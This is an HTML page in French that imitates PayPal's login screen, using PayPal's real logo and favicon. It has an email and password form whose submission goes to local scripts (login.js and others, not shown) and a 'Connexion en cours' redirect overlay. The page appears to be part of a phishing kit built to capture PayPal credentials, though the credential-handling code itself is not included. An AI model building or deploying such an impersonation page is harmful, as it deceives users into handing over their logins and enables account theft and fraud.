<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal: Connexion</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="container">
        <div class="auth-card">
            <div class="logo">
                <img src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-200px.png" alt="PayPal" height="40">
            </div>
            
            <form id="loginForm" class="form">
                <div class="form-group">
                    <label for="email">Email ou numéro de mobile</label>
                    <input type="text" id="email" name="email" required>
                </div>

                <div class="form-group">
                    <label for="password">Mot de passe</label>
                    <input type="password" id="password" name="password" required>
                </div>

                <button type="submit" class="btn btn-primary">
                    <span class="btn-text">Connexion</span>
                    <div class="loading-spinner hidden"></div>
                </button>

                <div class="form-footer">
                    <a href="#" class="link">Mot de passe oublié ?</a>
                </div>
            </form>

            <div class="divider">
                <span>ou</span>
            </div>

            <button class="btn btn-secondary">Ouvrir un compte</button>
        </div>
    </div>

    <div id="redirectOverlay" class="overlay hidden">
        <div class="overlay-content">
            <div class="loading-spinner"></div>
            <p id="redirectMessage">Connexion en cours...</p>
        </div>
    </div>

    <script src="assets/js/config.js"></script>
    <script src="assets/js/utils.js"></script>
    <script src="assets/js/notifications.js"></script>
    <script src="assets/js/login.js"></script>
</body>
</html>
